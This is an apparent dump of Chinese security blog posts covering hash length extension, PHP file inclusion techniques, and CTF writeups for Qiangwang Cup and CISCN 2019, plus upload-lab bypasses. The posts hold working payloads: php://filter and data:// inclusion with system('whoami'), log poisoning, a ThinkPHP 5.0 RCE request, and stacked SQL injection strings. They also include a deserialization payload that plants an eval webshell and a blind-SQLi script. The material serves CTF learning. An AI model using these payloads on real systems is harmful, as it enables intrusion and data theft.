word&#39;","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"哈希长度拓展攻击———HashPump的使用","slug":"哈希长度拓展攻击———HashPump的使用","date":"2019-06-15T01:50:51.000Z","updated":"2019-08-21T07:46:16.805Z","comments":true,"path":"2019/06/15/哈希长度拓展攻击———HashPump的使用/","link":"","permalink":"http://yoursite.com/2019/06/15/哈希长度拓展攻击———HashPump的使用/","excerpt":"哈希长度拓展攻击前言在一些CTF的比赛题目中见到过这种类型的题目，当时都是写完就不管了，没有认真的总结过，现在总结一下哈希拓展攻击的一些利用方式。","text":"哈希长度拓展攻击前言在一些CTF的比赛题目中见到过这种类型的题目，当时都是写完就不管了，没有认真的总结过，现在总结一下哈希拓展攻击的一些利用方式。哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。 利用条件 知道密钥长度 知道明文 知道部分的密文 HashPump的使用方法通常遇到这种类型题，都是使用的HashPump这个工具来辅助求解的。 HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。 HashPump的安装我是安装在kali虚拟机上的 git clone https://github.com/bwall/HashPump apt-get install g++ libssl-dev cd HashPump make make install 这个工具还支持python拓展 pip install hashpumpy HashPump的使用方法题目一实验吧的——让我进去吧 打开题目发现是个登陆页面发现，尝试之后发现没有注册的页面，于是尝试抓包看一下是否存在什么东西 发现cookie之里面的source=0很突兀，尝试修改为1,发现出现了源码。 $flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;; $secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security! $username = $_POST[&quot;username&quot;]; $password = $_POST[&quot;password&quot;]; if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); } } setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[&quot;source&quot;])) { setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[&quot;source&quot;] != 0) { echo &quot;&quot;; // This source code is outputted here } } 代码审计一下： 我们发现时很明显的哈希长度攻击。 secret的长度 data的值 secret+data 的MD5值我们就能构造出secret+data+其他值 的MD5 获取flag的格式： 1.传进一个cookie使其等于secret+urldecode($username . $password)MD5加密后的结果且后面部分要求为adminadmin 所以我们需要的就是构造cookie使其相等 2.得到对应的getmein:一个MD5的值需要 我们可以使用HashPump这个攻击来进行构造： 就可以在不知密文的情况下，构造出一个合法的md5值。就可以通过验证得到flag。","categories":[],"tags":[{"name":"web常见漏洞","slug":"web常见漏洞","permalink":"http://yoursite.com/tags/web常见漏洞/"}]},{"title":"文件包含漏洞","slug":"文件包含漏洞","date":"2019-06-12T04:03:31.000Z","updated":"2019-06-13T13:26:26.011Z","comments":true,"path":"2019/06/12/文件包含漏洞/","link":"","permalink":"http://yoursite.com/2019/06/12/文件包含漏洞/","excerpt":"文件包含漏洞","text":"文件包含漏洞 简介文件包含这个漏洞，简单来说既是程序猿在开发中为了方便，会将在多个页面重复使用的代码单独写到一个文件中，在需要用到的地方直接包含进来，包含后的文件既相当于将被包含的整个文件内容复制到了包含处。因为在开发中是经常用到的，因此成为了攻击者的目标，便衍生了多种文件包含的攻击。 在php中文件包含函数include() include_once() require() require_once() filel_get_contents() fopen() readfile() 区别： include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行 require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行 require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件include_once()、require_once()与(include\\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。 在php中文件包含分为本地文件包含（LFI）和远程文件包含（RFI） 分类LFI(Local File Inclusion)本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。 RFI(Remote File Inclusion)远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。 但RFI的利用条件较为苛刻，需要php.ini中进行配置 allow_url_fopen = On allow_url_include = On 两个配置选项均需要为On，才能远程包含文件成功。 但是，在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 所以远程文件包含的利用条件比较苛刻. 本地文件包含(LFI)顾名思义，所要包含的文件是在服务器本身的文件 包含姿势php伪协议php://input利用条件： allow_url_include = On。 对allow_url_fopen不做要求。 姿势： php://filter利用它可以读取服务器中的文件 由于读取文件的数据直接输出在了页面上，如果读取的是php文件的话，浏览器会直接解析成php代码而不会显示，那么我们可以用这个协议将php文件中的代码以base64的形式输出在页面上： payload: index.php?file=php://filter/read=convert.base64-encode/resource=index.php 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。 其他姿势： file.php?file=php://filter/convert.base64-encode/resource=index.php 效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。 phar://利用条件： php版本大于等于php5.3.0 假设有个文件phpinfo.php，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包phpinfo.zip 利用： 指定绝对路径： file.php?file=phar://D:/phpStudy/WWW/phpinfo.zip/phpinfo.php 也可以使用相对路径： file.php?file=phar://phpinfo.zip/phpinfo.php 都可以成功发包含文件。 zip://利用条件： php版本大于等于php5.3.0 姿势： 构造zip包的方法和phar相同。但是使用zip伪协议，需要指定绝对路径，同时将#编码为%23,之后填上压缩包内的文件·。 file.php?file=zip://D:/phpStudy/WWW/phpinfo.zip%23phpinfo.php 若是使用相对路径，则会包含失败。 data：URI schema利用条件： php版本大于等于php5.2 allow_url_fopen = On allow_url_include = On 姿势一： ?file=data:text/plain,&lt;?php phpinfo();?&gt; 也可以执行命令： ?file=data:text/plain,&lt;?php system(&#39;whoami&#39;);?&gt; 姿势二： ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt; 也可以执行命令： ?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg== PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==的base64解码为：&lt;?php system(&#39;whoami&#39;);?&gt; 包含session利用条件： session文件路径已知，且其中内容部分可控。 姿势： php的session文件的保存路径可以在phpinfo的session.save_path看到。 常见的php-session存放位置： /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID 其中，session文件的格式时固定的：sess_[phpsessid].而phpsessid在发送的请求的cookie字段中可以看到。 测试代码： &lt;?php session_start(); $_SESSION[&#39;chuddy&#39;]=$_GET[&#39;file&#39;]; @include($_GET[&#39;file&#39;]); ?&gt; 先随便尝试访问一下，存储一个session文件，我们打开访问：http://192.168.1.153/session.php?file=chuddy 查看这个session文件的内容为：chuddy|s:6:&quot;chuddy&quot;;#发现存储了file值。于是尝试包含session文件。 抓包访问：记住这个PHPSESSID=asudiplcmv80km7fb5klokpki0,于是得到session文件名为：sess_asudiplcmv80km7fb5klokpki0，所以session文件的路径为/var/lib/php/session/sess_asudiplcmv80km7fb5klokpki0 可以成功包含！ 本地日志等文件的包含顾名思义，所要包含的文件是在服务器本身的文件，我们可以读取一些在服务器上特殊的敏感信息 上网搜了一下敏感文件的位置： windows: c:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件 c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码 c:\\Program Files\\mysql\\my,ini // MySQL配置 c:\\Program Files\\mysql\\data\\mysql\\user.MYD // MySQL root c:\\windows\\php.ini // php 配置信息 c:\\windows\\my.ini // MySQL 配置文件 linux: /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 访问日志利用条件： 需要知道服务器日志的存储路径，且日志文件可读。 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，每个系统日志文件的存储位置不一样，centos日志保存路径在 /var/log/httpd/access.log , ubantu日志文件会保存在/var/log/apache2/access.log。 在本地常看日志会记录，一些什么信息。 192.168.1.115 - - [12/Jun/2019:15:19:23 +0800] &quot;GET /file.php HTTP/1.1&quot; 200 166&quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot; 通过对正常日志文件的分析发现，里面会存储我们访问的ip信息，请求的时间，请求求方式，url，客户端浏览器的信息等。 我们把shell藏在url里面 http://192.168.1.103/file.php?file=&lt;?php phpinfo();?&gt; 但是我们包含失败了，我们查看日志信息： 192.168.1.115 - - [13/Jun/2019:16:25:01 +0800] &quot;GET /file.php?file=%3C?php%20phpinfo();?%3E HTTP/1.1&quot; 200 203 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot; 发现一些特殊符号被编码使得无法正确解析。在access.log中还包括了用户访问的浏览器信息，也就是head头部中的User-Agent标识，如果我们把php代码插入到这里，那么同样也是可以执行的，先用burp抓一个包，插入php代码 然后查看日志文件： 192.168.1.115 - - [13/Jun/2019:04:02:42 +0800] &quot;GET /file.php?file=chuddy.php HTTP/1.1&quot; 200 - &quot;-&quot; &quot;&lt;?php phpinfo();?&gt;&quot; 发现php代码已经写在上面了。尝试包含即可 SSH日志包含利用条件：需要知道ssh-log的位置，且可读。 linux下ssh日志的位置： /var/log/secure /var/log/auth.log /var/log/messages Mac OS X(v10.4 or greater): /private/var/log/asl.log Mac OS X(v10.3 or earlier) /private/var/log/system.log Debian /var/log/auth.log centos的ssh日志路径为：/var/log/secure 我们尝试ssh连接ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@192.168.1.153 发现能在日志文件中成功写下&lt;?php phpinfo(); ?&gt;： Jun 13 04:37:43 localhost sshd[1829]: Invalid user &lt;?php phpinfo(); ?&gt; from 192.168.1.115 Jun 13 04:37:43 localhost sshd[1830]: input_userauth_request: invalid user &lt;?php phpinfo(); ?&gt; Jun 13 04:37:45 localhost sshd[1830]: Connection closed by 192.168.1.115 第一次尝试发现不能包含，查看之后，发现没有权限，赋给它权限之后才能成功包含。 包含临时文件php文件上传文件时，会创建临时文件。在linux下使用的是/tmp目录，而在windows下使用c:\\winsdows\\temp,在临时文件被删除之前，利用条件竞争可以包含该临时文件。这个和文件上传漏洞联系比较紧密。 加了一些限制的绕过方法在大多数的情况下，我们碰到的不会是简简单单的include $_GET[&#39;file&#39;];这样直接把变量传入包含函数内的，在很多时候包含的变量/文件，会被值订前缀和后缀。 指定前缀测试代码： &lt;?php $file = @$_GET[&#39;file&#39;]; include &#39;/var/www/html/&#39;.$file; ?&gt; 而在根目录下有一个flag文件内容为：&lt;?php phpinfo();?&gt; 目录遍历利用../可以进行目录遍历，比如我们尝试访问： include.php?file=../../../flag 则服务器端实际拼接出来的路径为：/var/www/html/../../../flag，也即/flag。从而包含成功。 但是有时候会对../做一些过滤，我们可以利用一些编码来进行绕过。 利用url编码 ../ %2e%2e%2f ..%2f %2e%2e/ ..\\ %2e%2e%5c ..%5c %2e%2e\\ 二次编码 ../ %252e%252e%252f ..\\ %252e%252e%255c 容器/服务器的编码方式 ../ ..%c0%af %c0%ae%c0%ae/ 注：java中会把”%c0%ae”解析为”\\uC0AE”，最后转义为ASCCII字符的”.”（点） Apache Tomcat Directory Traversal ..\\ ..%c1%9c 指定后缀名当包含的文件指定了后缀名时： &lt;?php @include($_GET[&#39;file&#39;].&quot;.html&quot;); ?&gt; 可以尝试利用以下方法绕过。 %00截断利用条件： 需要修改php.ini的配置： magic_quotes_gpc=off PHP小于5.3.4 例如上面例题代码一样：限制只能包含html文件。假如有一个phpinfo.php内容时&lt;?php phpinfo(); ?&gt;，直接包含时肯定不行的，文件名会变成phpinfo.php.html如果在参数后面加上一个%00，实现%00截断发现成功包含。 路径长度截断在windows最大长度是256，linux上是4096 payload: ?file=phpinfo.php/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ 点绕过适用于windows下，.要超过256 payload： ?file=phpinfo.php.................................................................................................................................................................................................................................................................. 远程文件包含(RFI)利用条件： allow_url_fopen = On allow_url_include = On 测试代码： &lt;?php $file = @$_GET[&#39;file&#39;]; @include($file); ?&gt; 在远程服务器上的文件代码(test.txt) &lt;?php phpinfo(); ?&gt; payload: http://127.0.0.1/file.php?file=http://192.168.1.103/test.txt 有限制远程文件包含漏洞绕过测试代码 &lt;?php $file = @$_GET[&#39;file&#39;]; @include($file.&quot;.html&quot;); ?&gt; 我们发现这里的后缀名被限制为.html。 urlurl格式： protocol :// hostname[:port] / path / [;parameters][?query]#fragment 在远程文件包含漏洞中，可以利用query或fragment来绕过后缀限制。 姿势一:query（?） http://127.0.0.1/file1.php?file=http://192.168.1.103/test.txt? 则包含的文件为 http://127.0.0.1/file1.php?file=http://192.168.1.103/test.txt?.html问号后面的部分.html，也就是指定的后缀被当作query从而被绕过。 姿势二：fragment（#） http://127.0.0.1/file1.php?file=http://192.168.1.103/test.txt%23 则包含的文件为问号后面的部分.html，也就是指定的后缀被当作fragment从而被绕过。注意需要把#进行url编码为%23。 windows和linux差别在windows上%00、%3f可以绕过，在linux除此之外%20也可以绕过 防御方案 在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败 做好文件的权限管理 php中可以使用open_basedir配置限制访问限制在指定的区域 过滤.、\\、/等 禁止服务器远程文件包含","categories":[],"tags":[{"name":"web常见漏洞","slug":"web常见漏洞","permalink":"http://yoursite.com/tags/web常见漏洞/"}]},{"title":"2019强网杯线上部分web writeup","slug":"2019强网杯线上部分web writeup","date":"2019-06-06T07:25:43.000Z","updated":"2019-06-07T08:31:48.352Z","comments":true,"path":"2019/06/06/2019强网杯线上部分web writeup/","link":"","permalink":"http://yoursite.com/2019/06/06/2019强网杯线上部分web writeup/","excerpt":"2019强网杯线上部分web writeup前言强网杯已经已经结束了好久了，都没有好好的总结一下，","text":"2019强网杯线上部分web writeup前言强网杯已经已经结束了好久了，都没有好好的总结一下， web随便注听名字就是一道注入的题目：题目链接 打开之后是一个,搜索框 提交1发现会输出一个对应的值，尝试一下1&#39;发现会得到报错，尝试一下万能密码1&#39; or &#39;1&#39;=&#39;1，发现能够把当前表所有的值全部输出出来，发现没有flag的值，意识到flag不再当前查询的表中，应该是在其他的表里面存着的。 尝试注入时，发现存在过滤： return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;, $inject); 发现过滤了select,.,where等，这就很难进行正常的注入了，需要另想办法。 尝试过报错注入，虽然能够得到数据库信息，但是过滤了select就很难进行进一步的注入。 通过多次的尝试，发现可以进行堆叠注入。 方法一通过堆叠注入，可以将sql注入的语句转换为16进制表示也可以bypass 1&#39;;set @t=0x73656c65637420312c323b;prepare x from @t;execute x; 但是尝试的时候发现过滤回显 strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;) 这是个strstr函数呀！可以用大小写绕过！ 将查询的字符串转换为16进制 payload = &quot;chuddy&#39;;set @s=%s;PREPARE a FROM @s;EXECUTE a;&quot; exp = &#39;select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()&#39; # exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;1919810931114514&#39;&quot; # exp = &quot;select flag from `1919810931114514`&quot; my_payload = payload%(&quot;0x&quot;+exp.encode(&#39;hex&#39;)) print my_payload payload为: 注表名： chuddy&#39;;set @s=0x73656c6563742067726f75705f636f6e636174285441424c455f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d64617461626173652829;PREPARE a FROM @s;EXECUTE a; 然后进行注列名 chuddy&#39;;set @s=0x73656c6563742067726f75705f636f6e63617428434f4c554d4e5f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e434f4c554d4e53207768657265205441424c455f4e414d453d273139313938313039333131313435313427;PREPARE a FROM @s;EXECUTE a; 得到flag chuddy&#39;;set @s=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;PREPARE a FROM @s;EXECUTE a; 方法二通过堆叠注入，尝试用char()进行绕过。 通过对sql注入的语句，转换成为单个的ascii码，然后通过char()函数进行转换以及利用concat()函数进行重新拼接，来bypass。 可以参考飘零师傅的博客。 进行编码的脚本： payload = &quot;0&#39;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot; exp = &#39;select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()&#39; # exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;1919810931114514&#39;&quot; # exp = &quot;select flag from `1919810931114514`&quot; res = &#39;&#39; for i in exp: res += &quot;char(%s),&quot;%(ord(i)) my_payload = payload%(res[:-1]) print my_payload getflag 0&#39;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a; 方法三过滤的内容为： return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;, $inject); 发现这里面没有过滤一些show,alter等一些字段，我们可以通过修改表名，和表的字段名，来进行换表，得到flag。 首先通过报错注入查看库名： 1&#39;and extractvalue(1, concat(0x7e, (database()),0x7e)) 库名为：supersqli 查表名 chuddy&#39;; show tables; 返回结果为： array(1) { [0]=&gt; string(16) &quot;1919810931114514&quot; } array(1) { [0]=&gt; string(5) &quot;words&quot; } 查表结构： 1&#39;;show create table words;show create table `1919810931114514`; 表结构为： array(2) { [0]=&gt; string(5) &quot;words&quot; [1]=&gt; string(114) &quot;CREATE TABLE `words` ( `id` int(10) NOT NULL, `data` varchar(20) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot; } array(2) { [0]=&gt; string(16) &quot;1919810931114514&quot; [1]=&gt; string(101) &quot;CREATE TABLE `1919810931114514` ( `flag` varchar(100) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot; } 我们可以将words表改名为aaa,将flag所在的表改名为word。 注意，word表的查询时查的id，我们还需要给flag添加一个字段名。来保证查询语句中的id可以查询。 最终payload为： 1&#39;;alter table `1919810931114514` add(id int default 1);alter table words rename aaa;alter table `1919810931114514` rename words;# 然后查询1就可以得到flag了。 强网先锋-上单打开可以发现列目录。点击进去发现像是ThinkPHP. 打开Readme. 发现ThinkPHP 5.0。随手百度一下框架漏洞，发现存在命令执行，直接上payload /1/public/index?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag 就能得到flag。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"ciscn华中线下部分web题解","slug":"ciscn华中线下部分web题解","date":"2019-06-04T13:31:56.000Z","updated":"2019-06-05T08:51:21.804Z","comments":true,"path":"2019/06/04/ciscn华中线下部分web题解/","link":"","permalink":"http://yoursite.com/2019/06/04/ciscn华中线下部分web题解/","excerpt":"前言被队友带飞，躺进了国赛的分区赛，去了武汉，华中科技大学是真的大","text":"前言被队友带飞，躺进了国赛的分区赛，去了武汉，华中科技大学是真的大 web1打开题目，发现是一个代码审计题目 &lt;?php // ini_set(&quot;display_errors&quot;, &quot;On&quot;); // error_reporting(E_ALL | E_STRICT); class BlogLog { public $log_ = &#39;/tmp/web_log&#39;; public $content = &#39;[access] %s&#39;; public function __construct($data=null) { $temp = $this-&gt;init($data); $this-&gt;render($temp); } public function init($data) { // No, you can&#39;t control an object anymore! $format = &#39;/O:\\d:/&#39;; $flag = true; $flag = $flag &amp;&amp; substr($data, 0, 2) !== &#39;O:&#39;; $flag = $flag &amp;&amp; (!preg_match($format, $data)); if ($flag){ return unserialize($data); } return []; } public function createLog($filename=null, $content=null) { if ($this-&gt;log_ != null) $filename = $this-&gt;log_; if ($this-&gt;content != null) $content = $this-&gt;content; file_put_contents($filename, $content); } public function render($k) { echo sprintf($this-&gt;content, $k[&#39;name&#39;]); } public function __destruct() { $this-&gt;createLog(); } } $data = &quot;&quot;; if (isset($_GET[&#39;data&#39;])){ $data = $_GET[&#39;data&#39;]; new BlogLog($data); } else highlight_file(__FILE__); 通过分析源码，可以看出这是个反序列化的题目 发现init存在反序列化，__destruct中会调用createLog方法，createLog方法中有file_put_contents函数，会将$content的内容写入名为$filename的文件。 其中存在着一些过滤： substr($data, 0, 2) !== &#39;O:&#39;;会判断传递的参数的前两位是不是:O: (!preg_match($format, $data));利用正则进行判断传递的数据中是否含有/O:\\d:/ 过滤1，我们可以通过数组来进行绕过 过滤2，我们可以通过采取在代表对象长度的前面添加+号来绕过。 这样就可以写入webshell。 构造如下： &lt;?php class BlogLog { public $log_ = &#39;./chuddy.php&#39;; public $content = &#39;&lt;?php @eval($_POST[\\&#39;chuddy\\&#39;]); ?&gt;&#39;; } $a = new BlogLog(); echo serialize($a).&quot;&lt;br&gt;&quot;; $a = array(&#39;a&#39; =&gt;&#39;chuddy&#39;, $a); $b = serialize($a); echo $b; ?&gt; payload: a%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22chuddy%22%3Bi%3A0%3BO%3A%2b7%3A%22BlogLog%22%3A2%3A%7Bs%3A4%3A%22log_%22%3Bs%3A12%3A%22.%2fchuddy.php%22%3Bs%3A7%3A%22content%22%3Bs%3A33%3A%22%3C%3Fphp%20@eval%28%24_POST%5B%27chuddy%27%5D%29%3B%20%3F%3E%22%3B%7D%7D 访问./chuddy.php，里面写上了一句话木马，密码为chuddy直接连接蚁剑得到flag web2这也是一道代码审计的题目： &lt;?php include &quot;secret.php&quot;; error_reporting(0); if(empty($_GET)) { highlight_file(__FILE__); die(&quot;get get get get args&quot;); } $a1=$_GET[&#39;a1&#39;]; $a2=$_GET[&#39;a2&#39;]; $a3=$_GET[&#39;a3&#39;]; $a4=$_GET[&#39;a4&#39;]; $obstacle_1=is_numeric($a2) and is_numeric($a1); if(!$obstacle_1) exit(&quot;foolish&quot;); if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;); if(isset($a1)) { $secret=hash_hmac(&#39;sha256&#39;,$a1,$secret); } $hmac=hash_hmac(sha256,$a2,$secret); if($a3!==$hmac) { die(&quot;OMG&quot;); } echo &quot;gogogo &quot;.$url; ?&gt; get get get get args 代码审计一下，发现： 利用get传递四个参数，分别为a1,a2,a3,a4。 其中$obstacle_1=is_numeric($a2) and is_numeric($a1);a1,a2必须为数字，也可以通过 a1[]=3绕过 对a2的限制：if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;); 可以通过16进制或者科学记数法进行绕过 a3必须等于hash_hmac(sha256,$a2,$secret); 通过查阅资料发现hash_hmac()函数，如果加密的是一个数组则会返回false if(isset($a1)) { $secret=hash_hmac(&#39;sha256&#39;,$a1,$secret); } 通过控制a1的值，我们可以让$secret为空，那么$hmac就可以控制了。 首先本地测试一下，计算出我们需要的a3值： &lt;?php // include &quot;secret.php&quot;; error_reporting(0); $secret=&quot;chuddyaaa&quot;; $url=&quot;aaa&quot;; if(empty($_GET)) { highlight_file(__FILE__); die(&quot;get get get get args&quot;); } $a1=$_GET[&#39;a1&#39;]; $a2=$_GET[&#39;a2&#39;]; $a3=$_GET[&#39;a3&#39;]; $a4=$_GET[&#39;a4&#39;]; $obstacle_1=is_numeric($a2) and is_numeric($a1); if(!$obstacle_1) exit(&quot;foolish&quot;); if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;); if(isset($a1)) { $secret=hash_hmac(&#39;sha256&#39;,$a1,$secret); } $hmac=hash_hmac(sha256,$a2,$secret); echo $hmac.&quot;&lt;br&gt;&quot;; if($a3!==$hmac) { die(&quot;OMG&quot;); } echo &quot;gogogo &quot;.$url; ?&gt; a3为：ccb3fd8a1db86958d3b3551964d5948dd90d002e8bc80077e951fbbeec9de120 payload: ?a1[]=1&amp;a2=1e9&amp;a3=ccb3fd8a1db86958d3b3551964d5948dd90d002e8bc80077e951fbbeec9de120 得到文件名： gogogo xinqingfuza2019qwieasjkdnzx.php 访问该文件名： 看到这个页面就猜测是，sql注入。 当输入123正常返回查询:123，但是如果传递参数123&#39;返回数据库操作异常 我们可以通过这个返回差异进行盲注。 测试发现一些敏感字符被替换成为了QAQ 过滤了if,or,and,|关键的字符串。 发现可以盲注，但是因为过滤了or 不能使用information_schema这个表来爆出表名，所以只能尝试猜表名。 比赛的时候就是没猜出来，表名没做出来题目，难受。 猜出表名之后可以无列明注入，来注出表的内容。 脚本如下： #coding=utf-8 import requests url = &quot;http://127.0.0.1/daxuesheng/web5/xinqingfuza2019qwieasjkdnzx.php&quot; flag = &quot;&quot; for j in range(40): for i in range(32,128): # pay = &quot;admin&#39; union select 1,2,cot(1 &amp;&amp; left(database(),&quot;+str(j+1)+&quot;)=binary(&#39;&quot;+flag+chr(i)+&quot;&#39;))&#39;#&quot; #库名：ciscn pay = &quot;admin&#39; union select 1,2,cot(1 &amp;&amp; left(((select group_concat(`3`) from (select 1,2,3 union select * from article)b)),&quot;+str(j+1)+&quot;)=binary(&#39;&quot;+flag+chr(i)+&quot;&#39;))&#39;#&quot; date = {&#39;usr&#39;:pay} res = requests.request(method=&#39;post&#39;, url=url,data=date) # print pay # print res.content # print i # exit() if &quot;数据库操作异常&quot; not in res.content: flag += chr(i); print flag break 总结这次线下赛，真的是神仙打架，大佬们疯狂得分，也意识到自己还有很多需要学习的地方，加油","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"文件上传靶场练习","slug":"文件上传靶场练习","date":"2019-05-28T12:21:57.000Z","updated":"2019-06-04T13:14:12.864Z","comments":true,"path":"2019/05/28/文件上传靶场练习/","link":"","permalink":"http://yoursite.com/2019/05/28/文件上传靶场练习/","excerpt":"文件上传漏洞前言文件上传漏洞是一个高危漏洞，想要复习一下，二刷一下文件上传靶场","text":"文件上传漏洞前言文件上传漏洞是一个高危漏洞，想要复习一下，二刷一下文件上传靶场 Pass-01提示： 本pass在客户端使用js对不合法图片进行检查！ 通过提示发现是在客户端用js进行验证的，js验证实在发送到服务器端之前而验证的，那么我们就可以在此之前做点手脚。 可以先上传一个合法的文件，通过抓包来进行修改参数，就可以绕过这个限制了。 Pass-02提示 本pass在服务端对数据包的MIME进行检查！ 源码为： $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload = true; } } else { $msg = &#39;文件类型不正确，请重新上传！&#39;; } } else { $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;; } } 在http数据包中，判断文件类型的是Content-Type字段的值 同样抓包，修改Content-Type为image/jpeg 就可以绕过判断 Pass-03提示： 本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！ 通过提示可以看出，应该是不完善的黑名单所导致的漏洞。 使用不存在于黑名单但是可执行的后缀即可 常见的可执行文件的后缀： PHP: php2、php3、php5、phtml、pht ASP: aspx、ascx、ashx、cer、asa JSP: jspx 注意：想要让服务器将你的文件解析为php，还需要将要修改httpd.conf：（把前面的#去掉） AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .php2 Pass-04提示： 